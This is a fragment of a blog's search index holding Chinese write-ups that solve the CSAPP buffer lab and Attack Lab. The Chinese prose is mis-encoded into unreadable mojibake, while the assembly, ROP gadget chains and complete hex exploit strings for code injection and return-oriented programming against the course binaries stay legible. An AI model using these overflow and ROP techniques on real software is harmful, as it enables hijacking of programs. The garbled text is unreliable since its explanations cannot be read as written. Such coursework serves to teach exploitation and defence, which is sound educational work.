æ³•ç¡®è®¤çš„ã€‚è‹±æ–‡æ–‡æ¡£ä¸­ä»‹ç»äº†å¯ä»¥ä½¿ç”¨ nop sled çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸€é—®é¢˜ã€‚å‚è€ƒ CSAPP æ•™æä¸­çš„ä»‹ç»ï¼š\nå› ä¸ºåœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæ ˆçš„åœ°å€æ˜¯å˜åŒ–çš„ã€‚æˆ‘ä»¬ä¸çŸ¥é“æœ‰æ•ˆæœºå™¨ä»£ç çš„å…¥å£åœ°å€äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æœ‰æ•ˆæœºå™¨ä»£ç å‰å¡«å……å¤§é‡çš„nopæŒ‡ä»¤ï¼Œåªè¦ç¨‹åºå¯ä»¥è·³è½¬åˆ°è¿™äº›nopæŒ‡ä»¤ä¸­ï¼Œé‚£ä¹ˆæœ€ç»ˆå°±å¯ä»¥æ»‘åˆ°æœ‰æ•ˆçš„æœºå™¨ä»£ç ã€‚\nè¿è¡Œgetbufnå‡½æ•°æ—¶ï¼Œä¼šéšæœºåœ¨æ ˆä¸Šåˆ†é…ä¸€å—å­˜å‚¨åœ°å€ï¼Œå› æ­¤ï¼Œgetbufnçš„åŸºå€ebpæ—¶éšæœºå˜åŒ–çš„ã€‚ä½†æ˜¯åˆè¦æ±‚æˆ‘ä»¬å†™çš„è·³è½¬åœ°å€æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥åœ¨æœ‰æ•ˆä»£ç ä¹‹å‰å¤§é‡å¡«å……nopæŒ‡ä»¤ï¼Œè®©è¿™æ®µåœ°å€å†…çš„ä»£ç éƒ½ä¼šæ»‘åˆ°è¿™æ®µnopä¹‹åçš„ä»£ç ä¸Šã€‚\nç”±äºæ ˆä¸Šçš„æœºå™¨ä»£ç æ˜¯æŒ‰åœ°å€ç”±ä½å‘é«˜é¡ºåºæ‰§è¡Œï¼Œè¦ä¿è¯äº”æ¬¡è¿è¡Œéƒ½èƒ½é¡ºåˆ©æ‰§è¡Œæœ‰æ•ˆæœºå™¨ä»£ç ï¼Œéœ€è¦æ»¡è¶³ï¼šè·³è½¬åœ°å€ä½äºæœ‰æ•ˆæœºå™¨ä»£ç å…¥å£åœ°å€ä¹‹å‰çš„nopæœºå™¨æŒ‡ä»¤å¡«å……åŒºã€‚è¿™è¦æ±‚å°½å¯èƒ½å¢å¤§nopå¡«å……åŒºï¼Œå°½å¯èƒ½ä½¿æœ‰æ•ˆæœºå™¨ä»£ç æ®µå¾€åæŒªã€‚\nä»åæ±‡ç¼–å¯ä»¥çœ‹å‡ºï¼Œbufçš„é¦–åœ°å€ä¸ºebp-0x208ï¼Œæ‰€ä»¥bufæ€»å…±çš„å¤§å°ä¸º520å­—èŠ‚ã€‚è€ƒè™‘è¿™ä¸ªå‡½æ•°ä¸­ï¼Œtestnçš„ebpéšæ¯æ¬¡è¾“å…¥éƒ½éšæœºå˜åŒ–ï¼Œä½†æ˜¯æ ˆé¡¶espçš„ä½ç½®å´ä¸å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡espå’Œebpçš„å…³ç³»æ¥æ‰¾å‡ºè¿™ä¸ªå…³ç³»ï¼Œä»è€Œè¿›è¡Œæ”»å‡»\né¦–å…ˆåœ¨subâ€‚$0x218ï¼Œespè¿™ä¸€å¥è®¾ç½®æ–­ç‚¹ï¼Œå¹¶ä½¿ç”¨-næ¨¡å¼è¿è¡Œç¨‹åºï¼Œå¹¶æŸ¥çœ‹ebpçš„å€¼ã€‚\næˆ‘ä»¬è¦åšçš„æ˜¯æ‰¾å‡ºæœ€å¤§çš„ebpå€¼0x556835e0ï¼Œå†å‡å»0x208ï¼Œå³ä¸ºæœ€é«˜çš„bufçš„å§‹åœ°å€ä¸ºï¼š0x556833D8ã€‚\nå¦‚æœå°†æœ‰æ•ˆæœºå™¨ä»£ç ç½®äºè·³è½¬åœ°å€ä¹‹å‰ï¼Œå¹¶å°†å…¶å®ƒæ‰€æœ‰å­—ç¬¦éƒ½ç”¨ä½œnopæŒ‡ä»¤ï¼Œæ­¤æ—¶æ‰€æœ‰äº”ä¸ªbufåœ°å€çš„å†™å…¥éƒ½èƒ½æ»¡è¶³è·³è½¬åˆ°åœ°å€0x556833D8åé¡ºåˆ©åˆ°è¾¾æœ‰æ•ˆæœºå™¨ä»£ç \næ¥ä¸‹æ¥éœ€è¦å¤„ç†çš„é—®é¢˜æ˜¯æ³¨å…¥å¹¶è¦†ç›– ebp åï¼ŒæŠŠæ­£ç¡®çš„ esp è¿˜åŸå›å»ã€‚ç ”ç©¶ testn çš„éƒ¨åˆ†æ±‡ç¼–ä»£ç ï¼š\nDump of assembler code for function testn: 0x08048e26 \u0026lt;+0\u0026gt;:\tpush %ebp 0x08048e27 \u0026lt;+1\u0026gt;:\tmov %esp,%ebp 0x08048e29 \u0026lt;+3\u0026gt;:\tpush %ebx 0x08048e2a \u0026lt;+4\u0026gt;:\tsub $0x24,%esp 0x08048e2d \u0026lt;+7\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 0x08048e32 \u0026lt;+12\u0026gt;:\tmov %eax,-0xc(%ebp) 0x08048e35 \u0026lt;+15\u0026gt;:\tcall 0x804920c \u0026lt;getbufn\u0026gt; 0x08048e3a \u0026lt;+20\u0026gt;:\tmov %eax,%ebx 0x08048e3c \u0026lt;+22\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; åœ¨æ¯ä¸€æ¬¡è°ƒç”¨äº† getbufn ä¹‹åï¼Œebp çš„å€¼å°†ä¼šè¢« push è¿›å»ã€‚è¿™ä¸ª ebp å€¼æ˜¯ç­‰äº testn è¢«è°ƒç”¨çš„æ—¶å€™ esp å­˜å‚¨çš„å€¼çš„ã€‚esp å…ˆç”±äº push ebx è€Œå‡å»äº† 4ï¼Œå†æ‰‹åŠ¨å‡å»äº† 0x24ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ exp + 0x28 çš„å€¼å°±æ˜¯ä¼ å…¥äº† getbufn å¼€å§‹çš„æ—¶å€™ ebp çš„å€¼ã€‚\næ‰€ä»¥æ„é€ å‡ºæ¥çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š\nlea 0x28(%esp), %ebp mov $0x362d5a70, %eax push $0x08048e3a ret åœ°å€ è§£é‡Š è¿”å›åœ°å€ è®¾ç½®æˆç¼“å†²åŒºçš„é¦–åœ°å€ ebp å ç”¨4å­—èŠ‚ \u0026hellip; \u0026hellip; ebp - 520å­—èŠ‚ buf æ•°ç»„çš„åˆå§‹åœ°å€ï¼Œä»è¿™é‡Œå¼€å§‹æ³¨å…¥ä¿®æ”¹ eax çš„ä»£ç  \u0026hellip; \u0026hellip; ebp - 0x218 espï¼Œæ ˆå¸§é¦–åœ°å€ ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu5285632878379324052.jpg","permalink":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bufferå®éªŒ"},{"content":"Attack lab è¯¥å®éªŒåœ¨æˆ‘ç”µè„‘çš„wslçš„ubuntuæ“ä½œç³»ç»Ÿä¸‹æ— æ³•æ­£å¸¸è¿è¡Œï¼Œåœ¨debianç¯å¢ƒä¸‹èƒ½æ­£å¸¸è¿è¡Œï¼Œæ³¨æ„è¿è¡Œæ—¶è¦åŠ ä¸Š-q\nPart I:Code Injection Attacks Level 1 é€šè¿‡è¾“å…¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºåŸç†ï¼Œå°†getbufå‡½æ•°çš„è¿”å›åœ°å€æ”¹æˆtouch1å‡½æ•°çš„å…¥å£åœ°å€\næ³¨æ„å­—èŠ‚é¡ºåº\ngetbufå‡½æ•°çš„åæ±‡ç¼–ä»£ç \n00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 call 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 ret 4017be:\t90 nop 4017bf:\t90 nop phase_1.txtæ–‡ä»¶\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 è¿è¡Œå‘½ä»¤\n./hex2raw \u0026lt; phase_1.txt |./ctarget -q Level 2 level2éœ€è¦å°†vlevelçš„å€¼æ”¹æˆcookieå€¼ï¼Œå†returnåˆ°touch2å‡½æ•°å…¥å£å¤„ã€‚\nä¿®æ”¹åçš„rspå¯„å­˜å™¨å¦‚ä¸‹æ‰€ç¤ºï¼š\nphase_2.txtæ–‡ä»¶\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 è¿è¡Œå‘½ä»¤\n./hex2raw \u0026lt; phase_1.txt |./ctarget -q ç»“æœ\nCookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level3 æœ¬é¢˜ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºä¼ çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å…ˆç»™å‡ºtouch3çš„Cè¯­è¨€ä»£ç \nvoid touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } touch3ä¸­è°ƒç”¨äº†hexmatchï¼Œå®ƒçš„Cè¯­è¨€ä»£ç ä¸ºï¼š\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦æŠŠcookieè½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ä¸²ä¼ è¿›å»\næ³¨æ„ç¬¬6è¡Œï¼Œsçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬å†™åœ¨getbufæ ˆä¸­çš„å­—ç¬¦ä¸²å¾ˆæœ‰å¯èƒ½è¢«è¦†ç›–ï¼Œä¸€æ—¦è¢«è¦†ç›–å°±æ— æ³•æ­£å¸¸æ¯”è¾ƒã€‚\nå› æ­¤ï¼Œè€ƒè™‘æŠŠcookieçš„å­—ç¬¦ä¸²æ•°æ®å­˜åœ¨testçš„æ ˆä¸Šï¼Œå…¶å®ƒéƒ¨åˆ†ä¸ä¸Šé¢˜ç›¸åŒï¼Œè¿™é‡Œä¸å†é‡å¤æ€è·¯ã€‚\næ³¨å…¥ä»£ç  å…ˆæŸ¥æ‰¾testæ ˆé¡¶æŒ‡é’ˆçš„ä½ç½®ï¼š\n0x5561dca8ï¼Œè¿™å°±æ˜¯å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®ï¼Œä¹Ÿæ˜¯è°ƒç”¨touch3åº”è¯¥ä¼ å…¥çš„å‚æ•°ï¼Œåˆtouch3ä»£ç çš„åœ°å€ä¸º4018faã€‚ä»è€Œå¾—åˆ°ä»£ç ï¼š\nmovq $0x5561dca8, %rdi pushq $0x4018fa ret å­—èŠ‚çº§è¡¨ç¤ºä¸ºï¼š\nDisassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq æ ˆå¸§è®²è§£ æˆ‘ä»¬æœŸæœ›çš„æ ˆå¸§ä¸º\né€»è¾‘å¦‚ä¸‹ï¼š\ngetbufæ‰§è¡Œretï¼Œä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°æˆ‘ä»¬æ³¨å…¥çš„ä»£ç  ä»£ç æ‰§è¡Œï¼Œå…ˆå°†å­˜åœ¨callerçš„æ ˆä¸­çš„å­—ç¬¦ä¸²ä¼ ç»™å‚æ•°å¯„å­˜å™¨%rdiï¼Œå†å°†touch3çš„åœ°å€å‹å…¥æ ˆä¸­ ä»£ç æ‰§è¡Œretï¼Œä»æ ˆä¸­å¼¹å‡ºtouch3æŒ‡ä»¤ï¼ŒæˆåŠŸè·³è½¬ Solution cookie0x59b997faä½œä¸ºå­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIä¸ºï¼š35 39 62 39 39 37 66 61\næ³¨å…¥ä»£ç æ®µçš„åœ°å€ä¸ä¸Šé¢˜ä¸€æ ·ï¼ŒåŒæ ·ä¸º0x5561dc78\nç”±äºåœ¨testæ ˆå¸§ä¸­å¤šåˆ©ç”¨äº†ä¸€ä¸ªå­—èŠ‚å­˜æ”¾cookieï¼Œæ‰€ä»¥æœ¬é¢˜è¦è¾“å…¥56ä¸ªå­—èŠ‚ã€‚æ³¨å…¥ä»£ç çš„å­—èŠ‚è¡¨ç¤ºæ”¾åœ¨å¼€å¤´ï¼Œ33-40ä¸ªå­—èŠ‚æ”¾ç½®æ³¨å…¥ä»£ç çš„åœ°å€ç”¨æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæœ€åå…«ä¸ªå­—èŠ‚å­˜æ”¾cookieçš„ASCII ã€‚äºæ˜¯å¾—åˆ°å¦‚ä¸‹è¾“å…¥ï¼š\n48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 æ”»å‡»æˆåŠŸï¼\nPart II:Return-Oriented Programing åœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬è¦æ”»å‡»çš„æ˜¯rtargetï¼Œä»–çš„ä»£ç å†…å®¹å’Œç¬¬ä¸€éƒ¨åˆ†ä¸€è‡´ï¼Œä½†é‡‡ç”¨äº†ä¸¤ç§ç­–ç•¥æ¥é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»\næ ˆéšæœºåŒ– è¿™æ®µç¨‹åºåˆ†é…çš„æ ˆçš„ä½ç½®æ­£æ¯æ¬¡è¿è¡Œæ—¶éƒ½æ˜¯éšæœºçš„ï¼Œè¿™å°±ä½¿æˆ‘ä»¬æ— æ³•ç¡®å®šåœ¨å“ªé‡Œæ’å…¥ä»£ç  é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸ ä¹Ÿå°±æ˜¯å­˜æ”¾åœ¨æ ˆä¸Šçš„ä»£ç ä¸å¯æ‰§è¡Œï¼Œä½¿å¾—æ’å…¥çš„æ¶æ„ä»£ç æ— æ³•æ‰§è¡Œ é’ˆå¯¹è¿™äº›é˜²å¾¡æªæ–½ï¼Œæ–‡æ¡£æä¾›äº†æ”»å‡»ç­–ç•¥ï¼Œå³ROPï¼šé¢å‘è¿”å›çš„ç¨‹åºè®¾è®¡ï¼Œå°±æ˜¯åœ¨å·²ç»å­˜åœ¨çš„ç¨‹åºä¸­æ‰¾åˆ°ç‰¹å®šçš„ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—ä¸ºæˆ‘ä»¬æ‰€ç”¨ï¼Œç§°è¿™æ ·çš„ä»£ç æ®µä¸ºgadgetï¼ŒæŠŠè¦ç”¨åˆ°éƒ¨åˆ†çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ¯æ¬¡retååˆä¼šå–å‡ºä¸€ä¸ªæ–°çš„gadgetï¼Œäºæ˜¯è¿™æ ·å°±èƒ½å½¢æˆä¸€ä¸ªç¨‹åºé“¾ï¼Œå®ç°æˆ‘ä»¬çš„ç›®çš„ã€‚æˆ‘å–œæ¬¢å°†è¿™ç§æ”»å‡»æ–¹å¼ç§°ä½œâ€œå°±åœ°å–æï¼Œæ‹¼å‡‘ä»£ç â€ã€‚\nåŒæ—¶ä¹Ÿç»™å‡ºæŒ‡ä»¤ç¼–ç è¡¨\nä¸¾ä¸ªä¾‹å­ï¼š\nrtargetæœ‰è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼š\nvoid setval_210(unsigned *p) { *p = 3347663060U; } å®ƒçš„æ±‡ç¼–ä»£ç å­—èŠ‚çº§è¡¨ç¤ºä¸ºï¼š\n0000000000400f15 \u0026lt;setval_210\u0026gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq æŸ¥è¡¨å¯çŸ¥ï¼Œå–å…¶ä¸­ä¸€éƒ¨åˆ†å­—èŠ‚åºåˆ— 48 89 c7 å°±è¡¨ç¤ºæŒ‡ä»¤movq %rax, %rdiï¼Œè¿™æ•´å¥æŒ‡ä»¤çš„åœ°å€ä¸º0x400f15ï¼Œäºæ˜¯ä»0x400f18å¼€å§‹çš„ä»£ç å°±å¯ä»¥å˜æˆä¸‹é¢è¿™æ ·ï¼š\nmovq %rax, %rdi ret è¿™ä¸ªå°ç‰‡æ®µå°±å¯ä»¥ä½œä¸ºä¸€ä¸ªgadgetä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚\nå…¶å®ƒä¸€äº›å¯ä»¥åˆ©ç”¨çš„ä»£ç éƒ½åœ¨æ–‡ä»¶farm.cä¸­å±•ç¤ºäº†å‡ºæ¥\nlevel1 æœ¬é¢˜çš„ä»»åŠ¡å’Œphase2ç›¸åŒï¼Œéƒ½æ˜¯è¦æ±‚è¿”å›åˆ°touch2å‡½æ•°ï¼Œphase2ä¸­ç”¨åˆ°çš„æ³¨å…¥ä»£ç ä¸º\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret ç”±äºæˆ‘ä»¬æ— æ³•æ‰¾åˆ°è¿™ä¸ªç‰¹å®šå€¼çš„gadgetï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†æˆ‘ä»¬éœ€è¦çš„å€¼å†™å…¥æ ˆä¸­ï¼Œå†åˆ©ç”¨popå‘½ä»¤å°†å…¶popåˆ°rdiå¯„å­˜å™¨ä¸­ï¼Œæœ€åå†è¿”å›touch2çš„å‡½æ•°èµ·å§‹åœ°å€ï¼Œä»»åŠ¡ä¾¿å®Œæˆã€‚\nä½†æ˜¯farmä¸­æ‰¾ä¸åˆ°popåˆ°rdiå¯„å­˜å™¨æŒ‡ä»¤çš„gadgetï¼Œæ‰€ä»¥æˆ‘ä»¬å¦è¾Ÿè¹Šå¾„ï¼Œå…ˆpopåˆ°raxä¸­ï¼Œå†mov %raxï¼Œ%rdiï¼Œå³\npopq %rax ret ############# mov %rax,%rdi ret é€»è¾‘å¦‚ä¸‹ï¼š\ngetbufæ‰§è¡Œretï¼Œä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°æˆ‘ä»¬çš„gadget01 gadget01æ‰§è¡Œï¼Œå°†cookieå¼¹å‡ºï¼Œèµ‹å€¼ç»™%raxï¼Œç„¶åæ‰§è¡Œretï¼Œç»§ç»­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°gadget2 gadget2æ‰§è¡Œï¼Œå°†cookieå€¼æˆåŠŸèµ‹å€¼ç»™å‚æ•°å¯„å­˜å™¨%rdiï¼Œç„¶åæ‰§è¡Œretï¼Œç»§ç»­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°touch2 Solution é¦–è¦é—®é¢˜æ˜¯æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„gadget\nå…ˆç”¨å¦‚ä¸‹æŒ‡ä»¤å¾—åˆ°targetçš„æ±‡ç¼–ä»£ç åŠå­—èŠ‚çº§è¡¨ç¤º\nobjdump -d rtarget \u0026gt; rtarget.s æŸ¥è¡¨çŸ¥ï¼Œpop %raxç”¨58è¡¨ç¤ºï¼Œäºæ˜¯æŸ¥æ‰¾58\n00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq retq å¾—åˆ°æŒ‡ä»¤åœ°å€ä¸º0x4019ab\nmovq %rax, %rdiè¡¨ç¤ºä¸º48 89 c7ï¼Œåˆšå¥½èƒ½æ‰¾åˆ°ï¼å…¶ä¸­ 90 è¡¨ç¤ºâ€œç©ºâ€ï¼Œå¯ä»¥å¿½ç•¥\n00000000004019c3 \u0026lt;setval_426\u0026gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq å¾—åˆ°æŒ‡ä»¤åœ°å€ä¸º0x4019c5\næ ¹æ®ä¸Šå›¾çš„æ ˆå¸§ï¼Œå°±èƒ½å†™å‡ºè¾“å…¥åºåˆ—ï¼š\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 level2 æ¥è‡ªå®˜æ–¹çš„åŠé€€å“ˆå“ˆå“ˆï¼ŒBefore you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. Thatâ€™s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\nè¿™é“é¢˜ä¸»è¦æ˜¯åœ¨rtargetä¸­è¿”å›åˆ°touch3ï¼Œçœ‹ä¼¼æ²¡æœ‰éš¾åº¦\nPhase 3ä¸­ç”¨åˆ°çš„æ³¨å…¥ä»£ç ä¸ºï¼š\nmovq $0x5561dca8, %rdi pushq $0x4018fa ret å…¶ä¸­0x5561dca8æ˜¯æ ˆä¸­cookieå­˜æ”¾çš„åœ°å€ã€‚\nåœ¨æœ¬é¢˜ä¸­ç”±äºæ ˆéšæœºåŒ–ï¼Œä¸èƒ½ç›´æ¥å°†0x5561dca8åœ°å€ç›´æ¥ç»™%rdiï¼Œå¯ä»¥åˆ©ç”¨%rspçš„ç›¸å¯¹åç§»é‡æ¥è·å–cookieçš„å­˜æ”¾åœ°å€ï¼Œ\nmovq $0x30(%rsp), %rdi movq %rsp, %rax movq %rax, %rdi lea (%rdi,%rsi,1),%rax movq %rax, %rdi movl %eax, %edi movl %eax, %edx movl %esp, %eax movl %ecx, %esi pushq $0x4018fa ret æŸ¥è¡¨ï¼Œmovq %rsp, xxxè¡¨ç¤ºä¸º48 89 xxï¼ŒæŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ç”¨çš„gadget\n0000000000401aab \u0026lt;setval_350\u0026gt;: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq è¿˜çœŸæ‰¾åˆ°äº†ï¼Œ48 89 e0å¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º\nmovq %rsp, %rax åœ°å€ä¸ºï¼š0x401aad\næ ¹æ®æç¤ºï¼Œæœ‰ä¸€ä¸ªgadgetä¸€å®šè¦ç”¨ä¸Š\n00000000004019d6 \u0026lt;add_xy\u0026gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq åœ°å€ä¸ºï¼š0x4019d6\né€šè¿‡åˆé€‚çš„èµ‹å€¼ï¼Œè¿™æ®µä»£ç å°±èƒ½å®ç°%rspåŠ ä¸Šæ®µå†…åç§»åœ°å€æ¥ç¡®å®šcookieçš„ä½ç½®\nå‰©ä¸‹éƒ¨åˆ†æµç¨‹ä¸Phase 3ä¸€è‡´ï¼Œå¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š\nå…ˆå–å¾—æ ˆé¡¶æŒ‡é’ˆçš„ä½ç½® å–å‡ºå­˜åœ¨æ ˆä¸­å¾—åç§»é‡çš„å€¼ é€šè¿‡lea (%rdi,%rsi,1),%raxå¾—åˆ° cookie çš„åœ°å€ å°† cookie çš„åœ°å€ä¼ ç»™%rdi è°ƒç”¨touch 3 ç”±äºgadgetçš„é™åˆ¶ï¼Œä¸­é—´çš„ç»†èŠ‚éœ€è¦å¾ˆå¤šå°è¯•ï¼Œå°è¯•è¿‡ç¨‹ä¸å†ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œç›´æ¥ç»™å‡ºä»£ç \n#åœ°å€ï¼š0x401aad movq %rsp, %rax ret #åœ°å€ï¼š0x4019a2 movq %rax, %rdi ret #åœ°å€ï¼š0x4019cc popq %rax ret #åœ°å€ï¼š0x4019dd movl %eax, %edx ret #åœ°å€ï¼š0x401a70 movl %edx, %ecx ret #åœ°å€ï¼š0x401a13 movl %ecx, %esi ret #åœ°å€ï¼š0x4019d6 lea (%rdi,%rsi,1),%rax ret #åœ°å€ï¼š0x4019a2 movq %rax, %rdi ret æ³¨æ„movl %ecx, %esiè¿™æ¡æŒ‡ä»¤å¯¹åº”89 d1ï¼Œæˆªå–ä¸‹é¢éƒ¨åˆ†\n0000000000401a6e \u0026lt;setval_167\u0026gt;: 401a6e:\tc7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74:\tc3 æŒ‰ç†è¯´åé¢æ˜¯91ä¸æ˜¯90(nop)ï¼Œæ‰€ä»¥ä¸èƒ½å–ï¼Œä½†åœ¨x86æ±‡ç¼–ä¸­ï¼Œ0x91 è¡¨ç¤º xchg eax, ecx æŒ‡ä»¤ã€‚è¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯äº¤æ¢ %eax å’Œ %ecx å¯„å­˜å™¨çš„å€¼ã€‚ä¸å½±å“å¯„å­˜å™¨çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥ã€‚\næ ˆå¸§è®²è§£ ä¸ºèŠ‚çœç©ºé—´ï¼Œæ¯ä¸€è¡Œä»£ç éƒ½çœç•¥äº†åé¢çš„retï¼Œ\né€»è¾‘åœ¨å›¾ä¸Šæ ‡çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œå°±ä¸å†ç”¨æ–‡å­—å†™å•¦ï¼\nè¦æ³¨æ„ï¼Œgetbufæ‰§è¡Œretåç›¸å½“äºè¿›è¡Œäº†ä¸€æ¬¡popæ“ä½œï¼Œtestçš„æ ˆé¡¶æŒ‡é’ˆ%rsp=%rsp+0x8ï¼Œæ‰€ä»¥cookieç›¸å¯¹äºæ­¤æ—¶æ ˆé¡¶æŒ‡é’ˆçš„åç§»é‡æ˜¯0x48è€Œä¸æ˜¯0x50\nSolution æ ¹æ®ä¸Šå›¾çš„æ ˆå¸§ï¼Œå†™å‡ºè¾“å…¥åºåˆ—ï¼š\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8573152181181443583.jpg","permalink":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/","title":"CSAPP:attackå®éªŒ"},{"content":"Bombå®éªŒ é¢˜ç›®è§£æ 